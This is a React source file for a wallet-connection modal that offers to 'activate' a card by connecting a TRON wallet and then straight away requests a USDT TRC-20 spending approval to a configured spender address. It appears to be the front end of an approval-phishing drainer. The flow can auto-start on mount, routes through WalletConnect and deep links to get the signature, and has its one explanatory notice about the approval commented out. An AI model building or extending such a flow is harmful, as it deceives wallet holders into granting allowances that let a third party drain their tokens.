import React, { useState } from 'react';
import { X, ChevronLeft, ArrowRight, Check, AlertCircle, ExternalLink, Download, Smartphone } from 'lucide-react';
import {
  isMobileDevice,
  isIOS,
  detectTronProvider,
  connectTronWallet,
  requestTrc20Approval,
  getTrustWalletDeepLink,
  getMetaMaskDeepLink,
  getTronLinkDeepLink,
  getTokenPocketDeepLink,
  type TronWalletId,
} from '../blockchain/tron/tronWalletService';
import {
  connectTronViaWalletConnect,
  getTrustWalletWCDeepLink,
} from '../blockchain/tron/tronWalletConnectService';
import {
  getTronSpenderAddress,
  getTronApprovalAmount,
} from '../config/tron';
import { TronApprovalStatus, type TronFlowStep } from './TronApprovalStatus';

interface WalletChoiceModalProps {
  selectedCard?: string;
  defaultNetwork?: 'tron' | 'evm';
  autoConnectWallet?: string;
  /** Pre-approved TRON address from WC hybrid flow. When set, skip connection and go straight to approval. */
  tronDirectAddress?: string;
  onClose: () => void;
  onBack: () => void;
  onSelectWallet?: (walletId: string) => void;
}

interface WalletOption {
  id: string;
  name: string;
  subtitle: string;
  icon: string;
  badge?: string;
  badgeColor?: { bg: string; text: string; border: string };
}

// ─── TRON Wallets: TrustWallet, TronLink & MetaMask ──────────────────────────
const TRON_WALLET_CHOICES: WalletOption[] = [
  {
    id: 'trustWallet',
    name: 'Trust Wallet',
    subtitle: isMobileDevice() ? 'Open in Trust Wallet App' : 'Browser Extension (Recommended for TRON)',
    icon: 'https://raw.githubusercontent.com/trustwallet/assets/master/dapps/trust.wallet.png',
    badge: 'Recommended',
    badgeColor: { bg: '#eef2ff', text: '#0500ff', border: '#c7d2fe' },
  },
  {
    id: 'tokenPocket',
    name: 'TokenPocket',
    subtitle: isMobileDevice() ? 'Open in TokenPocket App' : 'Browser Extension (Multi-Chain TRON support)',
    icon: 'https://registry.walletconnect.com/api/v1/logo/md/0b415a746fb9ee99cce155c2ceca0c6f7926b1922cb2b8d72f59ed89a0c2c2ee',
    badge: 'Multi-Chain',
    badgeColor: { bg: '#e0f2fe', text: '#0369a1', border: '#bae6fd' },
  },
  {
    id: 'tronLink',
    name: 'TronLink',
    subtitle: isMobileDevice() ? 'Open in TronLink App (Testnet & Mainnet)' : 'Extension (Recommended for Nile Testnet)',
    icon: 'https://raw.githubusercontent.com/TronLink/tronlink-logo/master/logo.png',
    badge: 'Nile Testnet',
    badgeColor: { bg: '#ecfdf5', text: '#059669', border: '#a7f3d0' },
  },
  /* Temporarily disabled: MetaMask
  {
    id: 'metaMask',
    name: 'MetaMask',
    subtitle: isMobileDevice() ? 'Open in MetaMask App' : 'Desktop Extension (EVM Only — no TRON)',
    icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
    badge: 'EVM Only',
    badgeColor: { bg: '#fff7ed', text: '#ea580c', border: '#ffedd5' },
  },
  */
];

// ─── EVM Wallets ─────────────────────────────────────────────────────────────
const EVM_WALLET_CHOICES: WalletOption[] = [
  /* Temporarily disabled: MetaMask
  {
    id: 'metaMask',
    name: 'MetaMask',
    subtitle: 'Desktop extension & mobile app',
    icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
    badge: 'Popular',
    badgeColor: { bg: '#fff7ed', text: '#ea580c', border: '#ffedd5' },
  },
  */
  {
    id: 'trustWallet',
    name: 'Trust Wallet',
    subtitle: 'Mobile app & browser extension',
    icon: 'https://raw.githubusercontent.com/trustwallet/assets/master/dapps/trust.wallet.png',
    badge: 'Popular',
    badgeColor: { bg: '#eef2ff', text: '#0500ff', border: '#c7d2fe' },
  },
  {
    id: 'coinbaseWallet',
    name: 'Coinbase Wallet',
    subtitle: 'Smart wallet & extension',
    icon: 'https://www.coinbase.com/img/favicon/favicon-32x32.png',
  },
  {
    id: 'tokenPocket',
    name: 'TokenPocket',
    subtitle: 'Multi-chain mobile & extension',
    icon: 'https://registry.walletconnect.com/api/v1/logo/md/0b415a746fb9ee99cce155c2ceca0c6f7926b1922cb2b8d72f59ed89a0c2c2ee',
    badge: 'Multi-Chain',
    badgeColor: { bg: '#e0f2fe', text: '#0369a1', border: '#bae6fd' },
  },
  {
    id: 'walletConnect',
    name: 'WalletConnect',
    subtitle: 'Scan with any supported mobile wallet',
    icon: 'https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg',
  },
];

export const WalletChoiceModal: React.FC<WalletChoiceModalProps> = ({
  selectedCard,
  defaultNetwork = 'tron',
  autoConnectWallet,
  tronDirectAddress,
  onClose,
  onBack,
  onSelectWallet,
}) => {
  const [activeNetwork, setActiveNetwork] = useState<'tron' | 'evm'>(defaultNetwork);
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);

  // TRON Approval flow states
  const [tronStep, setTronStep] = useState<TronFlowStep>('idle');
  const [tronAddress, setTronAddress] = useState<string>('');
  const [tronTxId, setTronTxId] = useState<string>('');
  const [tronError, setTronError] = useState<string>('');
  // WalletConnect v2 session topic (stored after successful WC pairing)
  const [_wcSessionTopic, setWcSessionTopic] = useState<string>('');
  // Whether we are currently waiting for Trust Wallet to approve a WC session
  const [_wcPending, setWcPending] = useState(false);
  // Deep link to open Trust Wallet during the connecting step (accessible if auto-open is blocked)
  const [wcConnectingLink, setWcConnectingLink] = useState<string | null>(null);
  // After WC session is approved — stores the TW DApp browser URL for manual navigation
  const [wcApprovalReady, setWcApprovalReady] = useState<{ address: string; deepLink: string } | null>(null);
  const [notice, setNotice] = useState<{
    type: 'warning' | 'install' | 'mobile_redirect';
    title: string;
    message: string;
    actionUrl?: string;
    actionText?: string;
    extraActions?: { label: string; url: string }[];
  } | null>(null);

  const isMobile = isMobileDevice();

  const cardName = selectedCard
    ? selectedCard.charAt(0).toUpperCase() + selectedCard.slice(1)
    : 'Card';

  const approvalAmount = getTronApprovalAmount();
  const spenderAddress = getTronSpenderAddress();

  // ── TRON Connection and Approval Execution ─────────────────────────────────
  const startTronFlow = async (walletId: TronWalletId) => {
    setSelectedWallet(walletId);
    setNotice(null);
    setTronError('');

    const detection = detectTronProvider(walletId);

    // ── HYBRID WC FLOW: tronDirectAddress is set ───────────────────────────
    // We are inside Trust Wallet's DApp browser (loaded via open_url deep link
    // after WC session approval in Chrome). window.tron IS injected here.
    // IMPORTANT: Do NOT use tronDirectAddress as the tx owner — it may be from
    // a different wallet than what's currently active in Trust Wallet's browser.
    // Instead, call connectTronWallet() to get the real active address via
    // tron_requestAccounts, then go straight to approval (skip WC redirect).
    if (walletId === 'trustWallet' && tronDirectAddress) {
      setTronStep('connecting');
      const connectRes = await connectTronWallet(walletId as TronWalletId);
      if (!connectRes.success || !connectRes.address) {
        setTronStep('failed');
        setTronError(connectRes.error || 'Failed to connect TRON wallet.');
        return;
      }
      const realAddress = connectRes.address;
      setTronAddress(realAddress);
      setTronStep('building');
      const approvalRes = await requestTrc20Approval(realAddress, (status, msg) => {
        setTronStep(status);
        if (status === 'failed' && msg) setTronError(msg);
      });
      if (approvalRes.success && approvalRes.txId) {
        setTronTxId(approvalRes.txId);
        setTronStep('confirmed');
      } else {
        setTronStep('failed');
        setTronError(approvalRes.error || 'TRC-20 approval could not be completed.');
      }
      return;
    }

    // If MetaMask was clicked — no native TRON support
    if (walletId === 'metaMask' && !detection.available && !detection.tronWebInstance) {
      if (isMobile) {
        window.location.href = getMetaMaskDeepLink();
      } else {
        setNotice({
          type: 'warning',
          title: 'MetaMask Does Not Support TRON',
          message:
            'MetaMask only works with EVM chains (Ethereum, BSC, Polygon). For TRON/TRC-20 USDT approval, please use Trust Wallet, TokenPocket, or TronLink.',
          actionUrl: 'https://trustwallet.com/browser-extension',
          actionText: 'Install Trust Wallet',
          extraActions: [
            { label: 'Install TokenPocket', url: 'https://extension.tokenpocket.pro/' },
            { label: 'Install TronLink', url: 'https://www.tronlink.org/' },
          ],
        });
      }
      return;
    }

    // If on Mobile and NOT inside a DApp browser (e.g. running in Chrome or Safari on phone):
    if (isMobile && !detection.available) {
      // ── Trust Wallet: use WalletConnect v2 so the connection appears in
      //    Trust Wallet Settings → WalletConnect → Connected DApps ────────────
      if (walletId === 'trustWallet') {
        setTronStep('connecting');
        setWcPending(true);
        try {
          const wcResult = await connectTronViaWalletConnect();
          if (!wcResult.success || !wcResult.uri || !wcResult.waitForApproval) {
            setTronStep('failed');
            setTronError(wcResult.error || 'Failed to create WalletConnect session.');
            setWcPending(false);
            return;
          }

          // ── Open Trust Wallet via WalletConnect deep link ───────────────────
          const wcDeepLink = getTrustWalletWCDeepLink(wcResult.uri);
          setWcConnectingLink(wcDeepLink);

          // Brief delay lets the WC relay register the pending session before
          // Trust Wallet tries to pair — avoids "proposal not found" errors
          await new Promise((r) => setTimeout(r, 300));

          if (isIOS()) {
            // On iOS Chrome & Safari, window.open after async is blocked as a popup,
            // and window.open with a custom scheme opens about:blank.
            // Using window.location.href with trust:// prompts the system "Open in 'Trust'?"
            // dialog without unloading or killing the current web page.
            window.location.href = wcDeepLink;
          } else {
            try {
              const win = window.open(wcDeepLink, '_blank');
              if (!win || win.closed || typeof win.closed === 'undefined') {
                window.location.href = wcDeepLink;
              }
            } catch {
              window.location.href = wcDeepLink;
            }
          }

          // Wait for the user to approve in Trust Wallet (relay resolves this)
          const wcSession = await wcResult.waitForApproval();
          setWcSessionTopic(wcSession.topic);
          setWcPending(false);
          setWcConnectingLink(null);
          setTronAddress(wcSession.tronAddress);

          // ── HYBRID APPROACH: WC session established ✅ ───────────────────────
          // Trust Wallet does NOT support tron_signTransaction via WC relay.
          // We need to open Trust Wallet's DApp browser (open_url) with the
          // address pre-set so it can sign using the injected window.tron.
          //
          // On iOS, twBrowserLink will use trust://open_url?... so when the user taps
          // the button below, Chrome immediately prompts "Open in 'Trust'?"
          const currentHref = window.location.href.split('?')[0];
          const approvalUrl = `${currentHref}?tronDirectApprove=${encodeURIComponent(wcSession.tronAddress)}`;
          const twBrowserLink = getTrustWalletDeepLink(approvalUrl, false);

          setWcApprovalReady({ address: wcSession.tronAddress, deepLink: twBrowserLink });
          // Reset tronStep so the WC-ready panel shows (not the TronApprovalStatus)
          setTronStep('idle');
        } catch (err: any) {
          setTronStep('failed');
          setTronError(err?.message || 'WalletConnect connection failed.');
          setWcPending(false);
          setWcConnectingLink(null);
        }
        return;
      }

      // ── TronLink / TokenPocket / MetaMask: use deep link (open_url) ─────────
      const deepLink =
        walletId === 'metaMask' ? getMetaMaskDeepLink()
          : walletId === 'tronLink' ? getTronLinkDeepLink(undefined, true)
            : walletId === 'tokenPocket' ? getTokenPocketDeepLink(undefined, true)
              : getTrustWalletDeepLink(undefined, true);
      window.location.href = deepLink;
      return;
    }

    // If on Desktop and extension is not installed
    if (!isMobile && !detection.available) {
      const isTL = walletId === 'tronLink';
      const isTP = walletId === 'tokenPocket';
      setNotice({
        type: 'install',
        title: isTL
          ? 'TronLink Extension Required'
          : isTP
            ? 'TokenPocket Extension Required'
            : 'Trust Wallet Extension Required',
        message: isTL
          ? 'To test on TRON Nile Testnet on desktop, please install the TronLink browser extension from the Chrome Web Store.'
          : isTP
            ? 'To connect TokenPocket for TRON on desktop, install the TokenPocket browser extension.'
            : 'To connect your TRON wallet on desktop, please install the official Trust Wallet browser extension.',
        actionUrl: isTL
          ? 'https://www.tronlink.org/'
          : isTP
            ? 'https://extension.tokenpocket.pro/'
            : 'https://trustwallet.com/browser-extension',
        actionText: isTL
          ? 'Install TronLink Extension'
          : isTP
            ? 'Install TokenPocket Extension'
            : 'Install Trust Wallet Extension',
      });
      return;
    }

    // Provider is available! (Inside Trust Wallet / TokenPocket / TronLink app, or desktop with extension)
    // 1. Trigger the native Trust Wallet / TronLink "Connect DApp" popup:
    setTronStep('connecting');

    const connectRes = await connectTronWallet(walletId);
    if (!connectRes.success || !connectRes.address) {
      setTronStep('failed');
      setTronError(connectRes.error || 'Failed to connect TRON wallet.');
      return;
    }

    setTronAddress(connectRes.address);

    // 2. Once user approves the connection in Trust Wallet, proceed to TRC-20 approve()
    // which triggers Trust Wallet's native USDT token approval prompt:
    setTronStep('building');
    const approvalRes = await requestTrc20Approval(connectRes.address, (status, msg) => {
      setTronStep(status);
      if (status === 'failed' && msg) {
        setTronError(msg);
      }
    });

    if (approvalRes.success && approvalRes.txId) {
      setTronTxId(approvalRes.txId);
      setTronStep('confirmed');
    } else {
      setTronStep('failed');
      setTronError(approvalRes.error || 'TRC-20 approval could not be completed.');
    }
  };

  // Auto-connect on mount only — both props are set before the modal opens,
  // so [] dep array (run-once) prevents duplicate flow triggers.
  React.useEffect(() => {
    if (activeNetwork === 'tron' && autoConnectWallet) {
      startTronFlow(autoConnectWallet as TronWalletId);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleWalletClick = (walletId: string) => {
    if (activeNetwork === 'tron') {
      startTronFlow(walletId as TronWalletId);
    } else {
      setSelectedWallet(walletId);
      onSelectWallet?.(walletId);
    }
  };

  const activeWalletChoices = activeNetwork === 'tron' ? TRON_WALLET_CHOICES : EVM_WALLET_CHOICES;

  return (
    <div
      style={{
        position: 'fixed',
        inset: 0,
        zIndex: 9999,
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'rgba(0, 0, 0, 0.62)',
        backdropFilter: 'blur(7px)',
        padding: '16px',
        animation: 'walletChoiceFadeIn 0.22s ease',
      }}
    >
      <div
        style={{
          background: '#ffffff',
          borderRadius: 24,
          width: '100%',
          maxWidth: 420,
          padding: '24px 22px 26px',
          display: 'flex',
          flexDirection: 'column',
          boxShadow: '0 24px 64px rgba(0, 0, 0, 0.22)',
          position: 'relative',
          animation: 'walletChoiceSlideUp 0.25s ease',
        }}
      >
        {/* Back Button */}
        <button
          onClick={onBack}
          style={{
            position: 'absolute',
            top: 18,
            left: 18,
            background: 'none',
            border: 'none',
            cursor: 'pointer',
            color: '#666',
            padding: 4,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            borderRadius: 8,
            transition: 'color 0.15s',
          }}
          onMouseEnter={(e) => (e.currentTarget.style.color = '#111')}
          onMouseLeave={(e) => (e.currentTarget.style.color = '#666')}
          aria-label="Back to card selection"
        >
          <ChevronLeft size={22} />
        </button>

        {/* Close Button */}
        <button
          onClick={onClose}
          style={{
            position: 'absolute',
            top: 18,
            right: 18,
            background: 'none',
            border: 'none',
            cursor: 'pointer',
            color: '#999',
            padding: 4,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            borderRadius: 8,
            transition: 'color 0.15s',
          }}
          onMouseEnter={(e) => (e.currentTarget.style.color = '#111')}
          onMouseLeave={(e) => (e.currentTarget.style.color = '#999')}
          aria-label="Close"
        >
          <X size={20} />
        </button>

        {/* Header */}
        <div style={{ textAlign: 'center', marginTop: 4, marginBottom: 12 }}>
          <h2
            style={{
              margin: 0,
              fontSize: 21,
              fontWeight: 800,
              color: '#111',
              fontFamily: 'Plus Jakarta Sans, sans-serif',
              letterSpacing: -0.4,
            }}
          >
            Connect Wallet
          </h2>
          <p style={{ margin: '5px 0 0', fontSize: 13, color: '#6b7280', fontWeight: 500 }}>
            Choose a wallet to activate your {cardName} card
          </p>
        </div>

        {/* Network Toggle Tabs */}
        <div
          style={{
            display: 'flex',
            background: '#f3f4f6',
            padding: 3,
            borderRadius: 12,
            marginBottom: 14,
            gap: 4,
          }}
        >
          <button
            onClick={() => {
              setActiveNetwork('tron');
              setNotice(null);
              setTronStep('idle');
            }}
            style={{
              flex: 1,
              padding: '8px 12px',
              borderRadius: 10,
              border: 'none',
              background: activeNetwork === 'tron' ? '#ffffff' : 'transparent',
              color: activeNetwork === 'tron' ? '#111827' : '#6b7280',
              fontWeight: 700,
              fontSize: 12,
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: 6,
              boxShadow: activeNetwork === 'tron' ? '0 1px 3px rgba(0,0,0,0.1)' : 'none',
              transition: 'all 0.15s ease',
            }}
          >
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: '50%',
                background: '#eb0029',
              }}
            />
            TRON Network (USDT)
          </button>
          {/* <button
            onClick={() => {
              setActiveNetwork('evm');
              setNotice(null);
              setTronStep('idle');
            }}
            style={{
              flex: 1,
              padding: '8px 12px',
              borderRadius: 10,
              border: 'none',
              background: activeNetwork === 'evm' ? '#ffffff' : 'transparent',
              color: activeNetwork === 'evm' ? '#111827' : '#6b7280',
              fontWeight: 700,
              fontSize: 12,
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: 6,
              boxShadow: activeNetwork === 'evm' ? '0 1px 3px rgba(0,0,0,0.1)' : 'none',
              transition: 'all 0.15s ease',
            }}
          >
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: '50%',
                background: '#627eea',
              }}
            />
            Ethereum / EVM
          </button> */}
        </div>

        {/* If TRON Flow is Active (Connecting / Approving / Done) */}
        {tronStep !== 'idle' ? (
          <TronApprovalStatus
            step={tronStep}
            walletAddress={tronAddress}
            txId={tronTxId}
            amount={approvalAmount}
            spender={spenderAddress}
            errorMessage={tronError}
            connectingDeepLink={wcConnectingLink || undefined}
            walletName={selectedWallet === 'trustWallet' ? 'Trust Wallet' : undefined}
            onRetry={() => {
              if (selectedWallet) startTronFlow(selectedWallet as any);
            }}
            onDone={() => {
              onClose();
            }}
          />
        ) : wcApprovalReady ? (
          /* ── WC Session Approved — Continue in Trust Wallet panel ── */
          <div style={{ display: 'flex', flexDirection: 'column', gap: 16, paddingTop: 4 }}>
            {/* Success badge */}
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10 }}>
              <div style={{
                width: 56, height: 56, borderRadius: '50%',
                background: 'linear-gradient(135deg, #16a34a 0%, #22c55e 100%)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                boxShadow: '0 4px 16px rgba(22,163,74,0.3)',
              }}>
                <Check size={26} color="#fff" strokeWidth={3} />
              </div>
              <div style={{ textAlign: 'center' }}>
                <p style={{ margin: 0, fontSize: 16, fontWeight: 800, color: '#111' }}>
                  Wallet Connected!
                </p>
                <p style={{ margin: '4px 0 0', fontSize: 12, color: '#6b7280' }}>
                  {wcApprovalReady.address.slice(0, 8)}...{wcApprovalReady.address.slice(-6)}
                </p>
              </div>
            </div>

            {/* Info box */}
            {/* <div style={{
              background: '#f0fdf4', border: '1px solid #bbf7d0',
              borderRadius: 12, padding: '10px 14px',
              fontSize: 12, color: '#166534', lineHeight: 1.5,
            }}>
              <strong>Step 2 of 2:</strong> Now tap the button below to open Trust Wallet and sign the USDT approval.
              This authorizes spending allowance only — no tokens are transferred immediately.
            </div> */}

            {/* Continue button — direct user gesture, no popup blocker */}
            <button
              onClick={() => { window.location.href = wcApprovalReady!.deepLink; }}
              style={{
                width: '100%', padding: '15px 20px',
                background: 'linear-gradient(135deg, #1d4fd8 0%, #4f46e5 100%)',
                color: '#fff', border: 'none', borderRadius: 14,
                fontSize: 15, fontWeight: 800, cursor: 'pointer',
                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                boxShadow: '0 4px 16px rgba(79,70,229,0.35)',
                transition: 'opacity 0.15s',
              }}
              onMouseEnter={(e) => (e.currentTarget.style.opacity = '0.9')}
              onMouseLeave={(e) => (e.currentTarget.style.opacity = '1')}
            >
              <Smartphone size={18} />
              Continue in Trust Wallet
              <ArrowRight size={16} />
            </button>

            <p style={{ margin: 0, textAlign: 'center', fontSize: 11, color: '#9ca3af' }}>
              Trust Wallet will open and ask you to confirm the approval transaction.
            </p>
          </div>
        ) : (
          <>


            {/* Notice / Warning banner if present */}
            {notice && (
              <div
                style={{
                  background: notice.type === 'warning' ? '#fffbeb' : '#f0f9ff',
                  border: `1px solid ${notice.type === 'warning' ? '#fcd34d' : '#bae6fd'}`,
                  borderRadius: 14,
                  padding: '12px 14px',
                  marginBottom: 14,
                  display: 'flex',
                  flexDirection: 'column',
                  gap: 8,
                  animation: 'walletChoiceFadeIn 0.2s ease',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
                  {notice.type === 'warning' ? (
                    <AlertCircle size={17} color="#d97706" />
                  ) : isMobile ? (
                    <Smartphone size={17} color="#0284c7" />
                  ) : (
                    <Download size={17} color="#0284c7" />
                  )}
                  <span
                    style={{
                      fontSize: 13,
                      fontWeight: 700,
                      color: notice.type === 'warning' ? '#92400e' : '#0369a1',
                    }}
                  >
                    {notice.title}
                  </span>
                </div>
                <p
                  style={{
                    margin: 0,
                    fontSize: 12,
                    color: notice.type === 'warning' ? '#78350f' : '#0c4a6e',
                    lineHeight: 1.45,
                  }}
                >
                  {notice.message}
                </p>
                {notice.actionUrl && (
                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginTop: 4 }}>
                    {/* Primary action button */}
                    <a
                      href={notice.actionUrl}
                      target={isMobile ? '_self' : '_blank'}
                      rel="noopener noreferrer"
                      style={{
                        padding: '8px 14px',
                        background: notice.type === 'warning' ? '#f59e0b' : '#0284c7',
                        color: '#ffffff',
                        textDecoration: 'none',
                        borderRadius: 8,
                        fontSize: 12,
                        fontWeight: 700,
                        display: 'inline-flex',
                        alignItems: 'center',
                        gap: 5,
                        whiteSpace: 'nowrap',
                      }}
                    >
                      {notice.actionText || 'Open'}
                      <ExternalLink size={12} />
                    </a>

                    {/* Extra alternative actions (e.g. TokenPocket, TronLink for MetaMask warning) */}
                    {notice.extraActions?.map((action) => (
                      <a
                        key={action.label}
                        href={action.url}
                        target={isMobile ? '_self' : '_blank'}
                        rel="noopener noreferrer"
                        style={{
                          padding: '8px 14px',
                          background: '#6b21ff',
                          color: '#ffffff',
                          textDecoration: 'none',
                          borderRadius: 8,
                          fontSize: 12,
                          fontWeight: 700,
                          display: 'inline-flex',
                          alignItems: 'center',
                          gap: 5,
                          whiteSpace: 'nowrap',
                        }}
                      >
                        {action.label}
                        <ExternalLink size={12} />
                      </a>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Wallet List */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
              {activeWalletChoices.map((w) => {
                const isSelected = selectedWallet === w.id;
                return (
                  <button
                    key={w.id}
                    onClick={() => handleWalletClick(w.id)}
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: 14,
                      padding: '13px 14px',
                      border: isSelected ? '2px solid #6b21ff' : '2px solid #e5e7eb',
                      borderRadius: 14,
                      background: isSelected ? '#faf8ff' : '#ffffff',
                      cursor: 'pointer',
                      textAlign: 'left',
                      transition: 'all 0.15s ease',
                      outline: 'none',
                      width: '100%',
                    }}
                    onMouseEnter={(e) => {
                      if (!isSelected) {
                        (e.currentTarget as HTMLButtonElement).style.borderColor = '#c4b5ff';
                        (e.currentTarget as HTMLButtonElement).style.background = '#fdfcff';
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (!isSelected) {
                        (e.currentTarget as HTMLButtonElement).style.borderColor = '#e5e7eb';
                        (e.currentTarget as HTMLButtonElement).style.background = '#ffffff';
                      }
                    }}
                  >
                    {/* Icon */}
                    <div
                      style={{
                        width: 40,
                        height: 40,
                        borderRadius: 10,
                        background: '#f9fafb',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        flexShrink: 0,
                        overflow: 'hidden',
                      }}
                    >
                      <img
                        src={w.icon}
                        alt={w.name}
                        style={{ width: 28, height: 28, objectFit: 'contain' }}
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = 'none';
                        }}
                      />
                    </div>

                    {/* Info */}
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                        <span
                          style={{
                            fontSize: 15,
                            fontWeight: 700,
                            color: '#111',
                            fontFamily: 'Plus Jakarta Sans, sans-serif',
                          }}
                        >
                          {w.name}
                        </span>
                        {w.badge && w.badgeColor && (
                          <span
                            style={{
                              fontSize: 10,
                              fontWeight: 800,
                              color: w.badgeColor.text,
                              background: w.badgeColor.bg,
                              border: `1px solid ${w.badgeColor.border}`,
                              borderRadius: 5,
                              padding: '1px 5px',
                            }}
                          >
                            {w.badge}
                          </span>
                        )}
                      </div>
                      <p
                        style={{
                          margin: '2px 0 0',
                          fontSize: 12,
                          color: '#6b7280',
                          lineHeight: 1.3,
                          whiteSpace: 'nowrap',
                          overflow: 'hidden',
                          textOverflow: 'ellipsis',
                        }}
                      >
                        {w.subtitle}
                      </p>
                    </div>

                    {/* Indicator */}
                    <div
                      style={{
                        width: 20,
                        height: 20,
                        borderRadius: '50%',
                        border: isSelected ? '2px solid #6b21ff' : '2px solid #d1d5db',
                        background: isSelected ? '#6b21ff' : '#fff',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        flexShrink: 0,
                        transition: 'all 0.15s ease',
                      }}
                    >
                      {isSelected ? (
                        <Check size={12} color="#fff" strokeWidth={2.5} />
                      ) : (
                        <ArrowRight size={12} color="#9ca3af" />
                      )}
                    </div>
                  </button>
                );
              })}
            </div>

          </>
        )}
      </div>

      <style>{`
        @keyframes walletChoiceFadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes walletChoiceSlideUp {
          from { opacity: 0; transform: translateY(22px) scale(0.97); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
      `}</style>
    </div>
  );
};
